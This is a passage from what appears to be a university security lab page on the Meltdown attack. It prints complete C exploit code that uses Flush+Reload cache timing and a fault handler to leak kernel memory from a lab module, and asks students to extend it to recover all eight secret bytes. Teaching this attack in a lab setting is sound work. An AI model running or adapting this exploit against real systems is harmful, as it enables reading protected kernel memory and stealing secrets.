secret (this result may be false), we add 1 to <code class="docutils literal notranslate"><span class="pre">scores[k]</span></code>. After
running the attack for many times, we use the value <code class="docutils literal notranslate"><span class="pre">k</span></code> with the
highest score as our final estimation of the secret. This will produce a
much reliable estimation than the one based on a single run. The revised
code is shown in the following.</p>
<div class="literal-block-wrapper docutils container" id="id17">
<span id="listing-7"></span><div class="code-block-caption"><span class="caption-text">Listing 7: MeltdownAttack.c</span><a class="headerlink" href="#id17" title="Permalink to this code">¶</a></div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;setjmp.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>

<span class="cm">/*********************** Flush + Reload ************************/</span>
<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
<span class="cm">/* cache hit time threshold assumed*/</span>
<span class="cp">#define CACHE_HIT_THRESHOLD (80)</span>
<span class="cp">#define DELTA 1024</span>

<span class="kt">void</span> <span class="nf">flushSideChannel</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

  <span class="c1">// Write to array to bring it to RAM to prevent Copy-on-write</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

  <span class="c1">//flush the values of the array from cache</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">scores</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">reloadSideChannelImproved</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">junk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
     <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
     <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
     <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">time2</span> <span class="o">&lt;=</span> <span class="n">CACHE_HIT_THRESHOLD</span><span class="p">)</span>
        <span class="n">scores</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">++</span><span class="p">;</span> <span class="cm">/* if cache hit, add 1 for this value */</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="cm">/*********************** Flush + Reload ************************/</span>

<span class="kt">void</span> <span class="nf">meltdown_asm</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel_data_addr</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">char</span> <span class="n">kernel_data</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   
   <span class="c1">// Give eax register something to do</span>
   <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
       <span class="s">&quot;.rept 400;&quot;</span>                
       <span class="s">&quot;add $0x141, %%eax;&quot;</span>
       <span class="s">&quot;.endr;&quot;</span>                    
    
       <span class="o">:</span>
       <span class="o">:</span>
       <span class="o">:</span> <span class="s">&quot;eax&quot;</span>
   <span class="p">);</span> 
    
   <span class="c1">// The following statement will cause an exception</span>
   <span class="n">kernel_data</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">kernel_data_addr</span><span class="p">;</span>  
   <span class="n">array</span><span class="p">[</span><span class="n">kernel_data</span> <span class="o">*</span> <span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>              
<span class="p">}</span>

<span class="c1">// signal handler</span>
<span class="k">static</span> <span class="n">sigjmp_buf</span> <span class="n">jbuf</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">catch_segv</span><span class="p">()</span>
<span class="p">{</span>
   <span class="n">siglongjmp</span><span class="p">(</span><span class="n">jbuf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  
  <span class="c1">// Register signal handler</span>
  <span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">catch_segv</span><span class="p">);</span>

  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;/proc/secret_data&quot;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">&quot;open&quot;</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="n">memset</span><span class="p">(</span><span class="n">scores</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">scores</span><span class="p">));</span>
  <span class="n">flushSideChannel</span><span class="p">();</span>
  
	  
  <span class="c1">// Retry 1000 times on the same address.</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">pread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	  <span class="n">perror</span><span class="p">(</span><span class="s">&quot;pread&quot;</span><span class="p">);</span>
	  <span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="c1">// Flush the probing array</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> 
		<span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">sigsetjmp</span><span class="p">(</span><span class="n">jbuf</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="n">meltdown_asm</span><span class="p">(</span><span class="mh">0xfb61b000</span><span class="p">);</span> <span class="p">}</span>

	<span class="n">reloadSideChannelImproved</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="c1">// Find the index with the highest score.</span>
  <span class="kt">int</span> <span class="n">max</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">scores</span><span class="p">[</span><span class="n">max</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">scores</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="n">max</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The secret value is %d %c</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">max</span><span class="p">,</span> <span class="n">max</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The number of hits is %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">scores</span><span class="p">[</span><span class="n">max</span><span class="p">]);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<p>Please compile and run the code, and explain your observations. The code
above only steals a one-byte secret from the kernel. The actual secret
placed in the kernel module has 8 bytes. You need to modify the above
code to get all the 8 bytes of the secret.</p>
</div>
<div class="section" id="submission">
<h2>Submission<a class="headerlink" href="#submission" title="Permalink to this headline">¶</a></h2>
<p>You need to submit a detailed lab report, with screenshots, to describe
what you have done and what you have observed. You also need to provide
explanation to the observations that are interesting or surprising.
Please also list the important code snippets followed by explanation.
Simply attaching code without any explanation will not receive credits.</p>
<div class="section" id="references">
<h3>References<a class="headerlink" href="#references" title="Permalink to this headline">¶</a></h3>
<p id="id1">[1] Pavel  Boldin.    Explains  about  little  assembly  code  #33. <a class="reference external" href="https://github.com/paboldin/meltdown-exploit/issues/33">https://github.com/paboldin/meltdown-exploit/issues/33</a>, 2018.</p>
<p id="id2">[2]  Wikipedia    contributors.Out-of-order    execution    —    wikipedia,the    free     encyclopedia. <a class="reference external" href="https://en.wikipedia.org/w/index.php?title=Out-of-order_execution&amp;oldid=826217063">https://en.wikipedia.org/w/index.php?title=Out-of-order_execution&amp;oldid=826217063</a>, 2018. [Online; accessed 21-February-2018].</p>
<p id="id3">[3]  Wikipedia  contributors.Protection  ring  —  wikipedia,  the  free  encyclopedia. <a class="reference external" href="https://en.wikipedia.org/w/index.php?title=Protection_ring&amp;oldid=819149884">https://en.wikipedia.org/w/index.php?title=Protection_ring&amp;oldid=819149884</a>,    2018.[Online; accessed 21-February-2018].</p>
<p id="id4">[4]  The Open Group.sigsetjmp- set jump point for a non-local goto. <a class="reference external" href="http://pubs.opengroup.org/onlinepubs/7908799/xsh/sigsetjmp.html">http://pubs.opengroup.org/onlinepubs/7908799/xsh/sigsetjmp.html</a>, 1997.</p>
<p id="id5">[5]  IAIK.Github   repository   for   meltdown   demonstration. <a class="reference external" href="https://github.com/IAIK/meltdown/issues/9">https://github.com/IAIK/meltdown/issues/9</a>, 2018.</p>
<p id="id6">[6]  Moritz Lipp, Michael Schwarz, Daniel Gruss, Thomas Prescher, Werner Haas, Stefan Mangard, PaulKocher, Daniel Genkin, Yuval Yarom, and Mike Hamburg. Meltdown.ArXiv e-prints, January 2018.</p>
<p id="id7">[7]  Yuval Yarom and Katrina Falkner.  Flush+reload:  A high resolution, low noise, l3 cache side-channelattack.  InProceedings of the 23rd USENIX Conference on Security Symposium, SEC’14, pages 719–732, Berkeley, CA, USA, 2014. USENIX Association.</p>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
        <a href="spectre_attack.html" class="btn btn-neutral float-right" title="Spectre Attack Lab" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
        <a href="hardware_index.html" class="btn btn-neutral float-left" title="Hardware Labs" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>
        &#169; Copyright 2021, NEXUS Lab.

    </p>
  </div>
    
    
    
    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    
    provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>
        </div>
      </div>

    </section>

  </div>
  

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script>

  
  
    
   

</body>
</html>